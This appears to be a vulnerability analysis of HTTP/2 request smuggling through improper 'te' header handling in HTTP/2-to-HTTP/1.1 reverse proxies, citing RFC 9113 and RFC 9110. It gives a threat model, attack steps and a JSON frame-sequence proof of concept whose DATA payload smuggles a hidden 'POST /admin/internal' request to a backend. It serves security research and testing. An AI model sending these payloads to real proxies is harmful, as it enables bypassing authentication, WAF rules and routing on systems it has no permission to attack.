## Threat Model

### Attack Assumption

- The target is an HTTP/2–terminating reverse proxy or load balancer that:
  - Accepts HTTP/2 connections from external clients (often over TLS).
  - Forwards requests to one or more HTTP/1.1 backends (H2→H1 gateway behavior).
- The proxy implementation:
  - Correctly parses HTTP/2 frames and reconstructs HTTP header fields.
  - **May be incomplete or buggy in its enforcement of HTTP/2 rules for the `te` header**, e.g.:
    - Allows `te` values other than `trailers`.
    - Forwards `te` verbatim to HTTP/1.1 backends.
    - Misinterprets `te` as a negotiation of transfer codings and rewrites it into `Transfer-Encoding: chunked` on the HTTP/1.1 side.

This is a common deployment pattern for CDNs, API gateways, and reverse proxies.

### Attacker Capability

- An external attacker can:
  - Establish an HTTP/2 connection to the front-end (client role).
  - Send arbitrary HTTP/2 `HEADERS` and `DATA` frames on new streams, including:
    - Arbitrary header fields and values (e.g., `te: chunked`).
    - Arbitrary request bodies at the byte level.
  - Open multiple parallel streams and control their timing and payloads.

The attacker cannot directly control the backend, but can observe responses and timing to infer smuggling success.

## Exploitability Assessment

The `te` field in HTTP/2 is **intentionally constrained**:

- It is **connection-specific** in HTTP/1.x semantics (RFC 9110 §7.6.1).
- In HTTP/2 (RFC 9113 §8.2.2):
  - Connection-specific headers (including TE) MUST NOT appear in messages.
  - **Exception**: `te` MAY appear **only on requests**, and when present:
    - It **MUST NOT contain any value other than `"trailers"`**.
- Any violation (wrong value, appearing on responses, mixed case name) MUST make the message **malformed** and be treated as a **stream error of type `PROTOCOL_ERROR`** (RFC 9113 §8.1.1, §8.2, §8.2.1).

From a *purely compliant* HTTP/2 server perspective, this is safe: non-conforming `te` usage must be rejected at the stream level.

However:

- RFC 9113 §8.2.1 and §10.3 explicitly discuss how **field validation failures can lead to request smuggling and intermediary desynchronization**, especially at HTTP/2→HTTP/1.x translation boundaries.
- RFC 9110 §7.6.1 states that `TE` is hop-by-hop and **MUST NOT be forwarded by intermediaries when translating between HTTP versions** — except in the constrained HTTP/2 sense (`te: trailers`).

Given the historical role of `TE`/`Transfer-Encoding` in HTTP/1.x request smuggling and the explicit warnings in RFC 9113, **any implementation that fails to enforce the “`te: trailers`-only, requests-only” rule is realistically exploitable**:

- An attacker can craft HTTP/2 requests with illegal `te` values (e.g., `te: chunked` or `te: trailers, chunked`).
- A flawed H2→H1 gateway may:
  - Forward `TE: chunked` to the backend, or
  - Synthesize `Transfer-Encoding: chunked` from the `te` value, or
  - Fail to strip hop-by-hop semantics.
- Combined with carefully crafted bodies and conflicting `Content-Length`, this enables classic **request smuggling** against HTTP/1.1 backends.

Under the provided threat model, **the `te` field is exploitable when misvalidated or mis-translated**.

## Attack Procedure

This section describes a realistic attack against an H2→H1 reverse proxy that improperly handles `te` in HTTP/2.

### 1. Preconditions / Implementation Flaws

The reverse proxy has all of the following flaws:

1. **Incomplete `te` validation**:
   - Accepts `te` with values other than `trailers` (e.g. `chunked`, `trailers, chunked`) without treating the stream as malformed (`PROTOCOL_ERROR`).
2. **Incorrect H2→H1 translation**:
   - When forwarding to HTTP/1.1, it:
     - Either passes `TE` as-is (`TE: trailers, chunked`), or
     - Erroneously maps `te: chunked` to `Transfer-Encoding: chunked`.
3. **Incorrect hop-by-hop handling**:
   - Does not strip/normalize connection-specific semantics as required by RFC 9110 §7.6.1.
4. Backend HTTP/1.1 server behavior:
   - Honors `Transfer-Encoding: chunked` or `TE: chunked` and can be influenced by TE/CL inconsistencies (common in historical smuggling exploits).

These flaws contradict RFC 9113 §8.2.2 and RFC 9110 §7.6.1 and match the classes of errors discussed in RFC 9113 §8.2.1 and §10.3.

### 2. High-Level Attack Goal

Use a single visible HTTP/2 request to the front-end to inject a **hidden HTTP/1.1 request** into the connection between the reverse proxy and backend. The target effect is **request smuggling**:

- The backend interprets extra bytes in the HTTP/1.1 request body as a second HTTP request.
- That smuggled request bypasses normal reverse-proxy routing, inspection, or authentication.

### 3. Attacker’s HTTP/2 Request

The attacker sends an HTTP/2 stream with:

- Headers:
  - A `te` value that is **illegal per HTTP/2** but accepted by the buggy proxy.
  - A conflicting `content-length` to confuse length-based parsing.
- Body:
  - A short body that satisfies `Content-Length` from the proxy’s point of view.
  - Followed by a raw embedded HTTP/1.1 request intended for the backend.

Example decoded headers:

```http
:method: POST
:scheme: https
:authority: victim.example
:path: /api/gateway
content-length: 4
te: trailers, chunked
```

Example `DATA` payload (4 visible bytes “ABCD” + smuggled request):

```text
ABCDPOST /admin/internal HTTP/1.1\r\n
Host: backend.internal\r\n
Content-Length: 0\r\n
\r\n
```

### 4. Faulty Translation at the Proxy

A flawed H2→H1 gateway might translate the above into an HTTP/1.1 request:

```http
POST /api/gateway HTTP/1.1
Host: victim.example
Content-Length: 4
TE: trailers, chunked

ABCDPOST /admin/internal HTTP/1.1
Host: backend.internal
Content-Length: 0

```

Or worse, if it wrongly interprets `te: chunked` semantics, it might send:

```http
POST /api/gateway HTTP/1.1
Host: victim.example
Transfer-Encoding: chunked

4
ABCD
POST /admin/internal HTTP/1.1
Host: backend.internal
Content-Length: 0

0

```

Depending on how the backend prioritizes `Transfer-Encoding` vs `Content-Length` and parses chunks:

- It may treat `ABCD` as the first (or only) chunk.
- The subsequent `POST /admin/internal HTTP/1.1 ...` bytes are then interpreted as a **second HTTP/1.1 request on the same connection**.

This is the classic TE-based request smuggling pattern, now enabled by a broken H2 `te` handling.

### 5. Security Impact

If the smuggled request targets a sensitive backend-only path (e.g., `/admin/internal`, `/debug`, or an alternate virtual host):

- The reverse proxy’s **routing**, **authentication**, or **WAF rules** may not apply to the smuggled request because:
  - It is not associated with any visible HTTP/2 stream at the front-end.
  - It may appear as a new request arriving from a “trusted” proxy.
- Attacker can:
  - Access internal-only endpoints.
  - Bypass WAF and logging.
  - Potentially poison cache entries or interfere with subsequent users’ requests (desynchronization).

The attack is enabled solely by mis-validation of the `te` header and incorrect translation across HTTP versions, which RFC 9113 explicitly warns against.

## Attack Message (HTTP/2 Frame Sequence PoC)

Below is a **conceptual** HTTP/2 frame sequence demonstrating the attack. Header values are shown decoded (HPACK compression omitted for clarity).

```json
[
  {
    "type": "SETTINGS",
    "stream_id": 0,
    "flags": [],
    "payload": {
      "settings": {
        "SETTINGS_MAX_CONCURRENT_STREAMS": 100
      }
    }
  },
  {
    "type": "SETTINGS",
    "stream_id": 0,
    "flags": ["ACK"],
    "payload": {}
  },
  {
    "type": "HEADERS",
    "stream_id": 1,
    "flags": ["END_HEADERS"],
    "headers": {
      ":method": "POST",
      ":scheme": "https",
      ":authority": "victim.example",
      ":path": "/api/gateway",
      "content-length": "4",
      "te": "trailers, chunked"
    }
  },
  {
    "type": "DATA",
    "stream_id": 1,
    "flags": ["END_STREAM"],
    "data": "ABCDPOST /admin/internal HTTP/1.1\r\nHost: backend.internal\r\nContent-Length: 0\r\n\r\n"
  }
]
```

Notes:

- The `HEADERS` frame contains an **illegal** HTTP/2 `te` value (`trailers, chunked`).
  - A compliant endpoint MUST treat this as a malformed request and send a `PROTOCOL_ERROR` on stream 1 (RFC 9113 §8.2.2, §8.1.1).
- A vulnerable H2→H1 proxy instead:
  - Accepts the stream.
  - Forwards equivalent TE/Transfer-Encoding semantics to the backend.
- The `DATA` frame concatenates:
  - `ABCD` → visible body for `/api/gateway`.
  - A full embedded HTTP/1.1 request to `/admin/internal` → smuggled.

An implementation using this frame sequence in testing can reproduce and detect this class of vulnerability if the backend observes unexpected requests or behavior.
